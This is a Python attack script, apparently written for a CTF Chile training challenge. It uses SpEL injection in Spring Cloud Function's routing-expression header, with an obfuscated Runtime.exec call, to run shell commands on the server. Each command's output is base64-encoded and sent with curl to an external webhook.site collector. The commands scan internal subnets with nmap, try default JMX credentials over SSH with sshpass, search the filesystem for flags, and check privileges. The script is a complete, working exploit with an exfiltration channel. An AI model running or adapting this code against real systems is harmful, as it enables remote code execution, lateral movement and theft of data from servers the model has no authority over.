#!/usr/bin/env python3
"""
CTF Chile - Pivoting a través de redes usando el bridge container
"""
import requests
import time
import base64

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

# Crear webhook
print("[*] Pivoting a través de las redes bridged...")
UUID = requests.post("https://webhook.site/token", timeout=10).json()["uuid"]
WH = "https://webhook.site/" + UUID
print(f"    Webhook: https://webhook.site/#!/{UUID}")

def probe(tag, cmd):
    shell = f"{cmd} | base64 -w0 | xargs -I X curl -s '{WH}/{tag}?d=X'"
    p = f'T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("exe"+"c",new String[]{{}}.getClass()).invoke(T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("getRunt"+"ime").invoke(null),new String[]{{"/bin/sh","-c","{shell}"}}).waitFor()'
    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": p,
            "Content-Type": "text/plain",
        }, data="x", timeout=20)
        print(f"    [+] {tag:30} http {r.status_code}")
    except Exception as e:
        print(f"    [!] {tag} error: {e}")

print("[*] FASE 1: Mapeando ambas redes desde el bridge...")

# Escanear ambas redes desde nuestra posición privilegiada
probe("scan_network_10_109_220", "nmap -sn 10.109.220.0/24 2>/dev/null | grep 'Nmap scan report'")
probe("scan_network_10_160_209", "nmap -sn 10.160.209.0/24 2>/dev/null | grep 'Nmap scan report'")

print("[*] FASE 2: Probando credenciales JMX en múltiples servicios...")

# Probar las credenciales JMX en diferentes hosts y servicios
jmx_creds = [("monitorRole", "QED"), ("controlRole", "R&D")]
targets = ["10.160.209.1", "10.109.220.1", "10.109.220.254"]

for user, password in jmx_creds:
    for target in targets:
        target_safe = target.replace(".", "_")
        user_safe = user.replace("Role", "")

        # SSH
        probe(f"ssh_{user_safe}_{target_safe}", f"timeout 8 sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 {user}@{target} 'echo SSH_SUCCESS_{user}_{target} && whoami && hostname && pwd' 2>/dev/null || echo 'SSH_FAILED_{user}:{password}@{target}'")

        # También probar sin el "Role" suffix
        if "Role" in user:
            simple_user = user.replace("Role", "")
            probe(f"ssh_{simple_user}_{target_safe}", f"timeout 8 sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 {simple_user}@{target} 'echo SSH_SUCCESS_{simple_user}_{target} && whoami && hostname && pwd' 2>/dev/null || echo 'SSH_FAILED_{simple_user}:{password}@{target}'")

print("[*] FASE 3: Escaneando servicios en hosts descubiertos...")

# Escaneo de puertos detallado en hosts objetivo
for target in targets:
    target_safe = target.replace(".", "_")
    probe(f"portscan_detailed_{target_safe}", f"timeout 25 nmap -p 21,22,23,25,80,443,993,995,1433,3306,3389,5432,8080,8443,9000,9999 {target} 2>/dev/null | grep -E '(open|filtered)'")

print("[*] FASE 4: Buscando flags en el bridge actual...")

# Ya que estamos en una posición privilegiada, buscar flags aquí
probe("flag_search_bridge", "find / -name '*flag*' -o -name '*ctf*' 2>/dev/null | head -10 | xargs cat 2>/dev/null")
probe("strings_flag_search", "strings /app/app.jar | grep -i 'ctfchile{' | head -5")

print("[*] FASE 5: Explorando conectividad hacia servicios internos...")

# Verificar conectividad y servicios en ambas redes
probe("ping_test_internal", "ping -c 1 10.160.209.1 && ping -c 1 10.109.220.1 && echo 'PING_TESTS_COMPLETE'")
probe("telnet_test_ssh", "timeout 5 telnet 10.160.209.1 22 && timeout 5 telnet 10.109.220.1 22")

print("[*] FASE 6: Verificando capabilities y privilegios...")

# Verificar nuestros privilegios actuales
probe("capabilities", "whoami && id && cat /proc/1/status | grep Cap")
probe("network_capabilities", "ip route && iptables -L 2>/dev/null | head -10")

time.sleep(25)

# Recoger y analizar respuestas
print("\n[*] Analizando resultados del pivoting...")
r = requests.get(f"https://webhook.site/token/{UUID}/requests?sorting=newest&per_page=40", timeout=15)
data = r.json().get("data", [])

ssh_successes = []
network_hosts = []
open_services = []
flags_found = []

for req in data:
    url = req.get("url", "")
    path = url.split(f"webhook.site/{UUID}/")[-1].split("?")[0]
    q = req.get("query") or {}
    raw = q.get("d")
    if isinstance(raw, list):
        raw = raw[0] if raw else ""

    print("=" * 70)
    print(f"🔍 TAG: {path}")

    if raw:
        try:
            decoded = base64.b64decode(raw).decode("utf-8", "replace")
            print(decoded)

            # Detectar SSH exitoso
            if "SSH_SUCCESS" in decoded:
                ssh_successes.append((path, decoded))
                print(f"\n🎉🎉🎉 SSH EXITOSO EN {path}! 🎉🎉🎉")

            # Detectar hosts en la red
            if "Nmap scan report" in decoded:
                hosts = [line.split("for ")[1].strip() for line in decoded.split("\n") if "Nmap scan report for" in line]
                network_hosts.extend(hosts)
                print(f"🖥️  HOSTS DESCUBIERTOS: {hosts}")

            # Detectar servicios abiertos
            if "open" in decoded.lower() and ("tcp" in decoded.lower() or "udp" in decoded.lower()):
                open_services.append((path, decoded))
                print(f"🔓 SERVICIOS ABIERTOS")

            # Buscar flags
            if "ctfchile{" in decoded.lower():
                flags_found.append((path, decoded))
                print(f"\n🚩🚩🚩 FLAG ENCONTRADO! 🚩🚩🚩")

        except Exception as e:
            print(f"(decode error) {raw[:100]}...")
    else:
        print("(sin payload)")

# Resumen final
print("\n" + "="*70)
print("📊 RESUMEN DEL BRIDGE PIVOTING")
print("="*70)

if ssh_successes:
    print(f"🎉 SSH EXITOSO: {len(ssh_successes)} conexiones")
    for path, content in ssh_successes:
        print(f"    ✅ {path}")
        print(f"       {content[:150]}...")
    print("\n🚀 ¡PIVOTING COMPLETADO! Continuar exploración desde host interno.")

elif open_services:
    print(f"🔓 SERVICIOS DESCUBIERTOS: {len(open_services)}")
    for path, content in open_services:
        print(f"    - {path}: {content[:100]}...")

if network_hosts:
    print(f"\n🖥️  HOSTS EN REDES: {len(set(network_hosts))}")
    for host in set(network_hosts):
        print(f"    - {host}")

if flags_found:
    print(f"\n🚩 FLAGS ENCONTRADOS: {len(flags_found)}")
    for path, flag in flags_found:
        print(f"    - {path}: {flag}")

print(f"\n🔗 Webhook: https://webhook.site/#!/{UUID}")